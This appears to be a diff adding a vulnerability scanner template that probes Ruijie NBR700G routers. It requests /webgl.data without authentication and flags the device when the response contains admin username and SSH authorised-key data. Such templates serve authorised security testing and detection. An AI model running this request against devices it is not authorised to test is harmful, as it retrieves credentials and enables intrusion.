@@ -1,0 +1,20 @@
+id: Ruijie_NBR700G_webgl_info_vul
+
+info:
+  name: Ruijie_NBR700G_webgl_info_vul
+  author: pitaya
+  severity: info
+
+http:
+  - raw:
+      - |+
+        GET /webgl.data HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body, "http_username", "sshd_authkeys")
